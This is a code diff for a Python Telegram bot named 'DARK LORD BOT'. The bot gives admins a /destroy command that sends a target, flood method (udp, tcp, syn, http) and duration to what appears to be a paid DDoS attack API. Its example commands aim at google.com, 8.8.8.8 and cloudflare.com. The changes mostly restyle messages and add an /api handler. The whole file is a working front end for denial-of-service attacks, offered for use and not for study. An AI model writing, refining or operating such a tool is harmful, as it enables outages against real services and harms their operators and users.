@@ -27,66 +27,67 @@ def launch_attack(target, method, duration):
 async def start(client, message):
     await message.reply(
         "👑 **DARK LORD BOT**\n\n"
-        "🔥 *Ultimate Destruction Power*\n\n"
+        "🔥 *Ultimate Destruction*\n\n"
         "**Commands:**\n"
         "⚡ `/destroy <target> <method> <duration>`\n"
         "📊 `/status`\n"
         "🌐 `/api`\n"
         "❓ `/help`\n\n"
-        "*Only Admin: 6975889263*"
+        "*Admin Only: 6975889263*"
     )
 
 @app.on_message(filters.command("destroy") & filters.private)
 async def destroy(client, message):
     user_id = message.from_user.id
     if user_id not in ADMIN_IDS:
-        return await message.reply("🚫 **DARK LORD Access Denied!**")
+        return await message.reply("🚫 **Access Denied!**")
     
     args = message.text.split()[1:]
     if len(args) < 3:
-        return await message.reply("❌ **Syntax:** `/destroy <target> <method> <duration>`\n\n**Ex:** `/destroy google.com udp 60`")
+        return await message.reply("❌ **Usage:** `/destroy <target> <method> <duration>`\n`/destroy google.com udp 60`")
     
     target, method, duration = args[0], args[1].lower(), args[2]
     
     await message.reply(
         f"⚡ **DARK LORD ACTIVATED**\n\n"
-        f"🎯 **Target:** `{target}`\n"
-        f"💥 **Method:** `{method}`\n"
-        f"⏱️ **Power:** `{duration}s`\n\n"
-        f"*Destruction in progress...*"
+        f"🎯 `{target}`\n"
+        f"💥 `{method}`\n"
+        f"⏱️ `{duration}s`\n"
+        f"*Destruction starting...*"
     )
     
     result = launch_attack(target, method, duration)
     
-    status = "💀 **TARGET DESTROYED!**" if result.get("success") else "❌ **Failed**"
-    await message.reply(
-        f"{status}\n\n"
-        f"📈 **Details:**\n"
-        f"`{target}` | `{method}` | `{duration}s`"
-    )
+    if result.get("success"):
+        await message.reply(f"💀 **TARGET DESTROYED!**\n\n`{target}` | `{method}` | `{duration}s`")
+    else:
+        await message.reply(f"❌ **Failed:** `{result}`")
 
-@app.on_message(filters.command("status", aliases=["api"]) & filters.private)
+@app.on_message(filters.command("status") & filters.private)
 async def status(client, message):
     await message.reply(
-        f"👑 **DARK LORD STATUS**\n\n"
-        f"🌐 **API:** `{API_URL}`\n"
-        f"🔑 **Key:** `{API_KEY[:15]}...`\n"
-        f"⚡ **Ready:** *Yes*\n"
-        f"👤 **Admin:** `{ADMIN_IDS[0]}`"
+        f"👑 **DARK LORD STATUS**\n"
+        f"🌐 API: `{API_URL}`\n"
+        f"🔑 Key: `{API_KEY[:15]}...`\n"
+        f"⚡ Ready: **Yes**\n"
+        f"👤 Admin: `{ADMIN_IDS[0]}`"
     )
 
+@app.on_message(filters.command("api") & filters.private)
+async def api_status(client, message):
+    await message.reply(f"🌐 **API:** `{API_URL}`\n🔑 **Status:** Connected")
+
 @app.on_message(filters.command("help") & filters.private)
-async def help(client, message):
+async def help_cmd(client, message):
     await message.reply(
-        "🔥 **DARK LORD COMMANDS**\n\n"
-        "• `/destroy <ip/domain> <udp/tcp/syn/http> <seconds>`\n"
-        "• `/status` - Bot status\n"
-        "• `/help` - This\n\n"
-        "**Examples:**\n"
-        "• `/destroy google.com udp 60`\n"
-        "• `/destroy 8.8.8.8 tcp 120`\n"
-        "• `/destroy cloudflare.com syn 300`"
+        "**DARK LORD Commands:**\n\n"
+        "⚡ `/destroy google.com udp 60`\n"
+        "📊 `/status`\n"
+        "❓ `/help`\n"
+        "🌐 `/api`\n\n"
+        "**Methods:** udp, tcp, syn, http"
     )
 
 print("👑 DARK LORD BOT Starting...")
+print(f"🌐 API: {API_URL}")
 app.run()
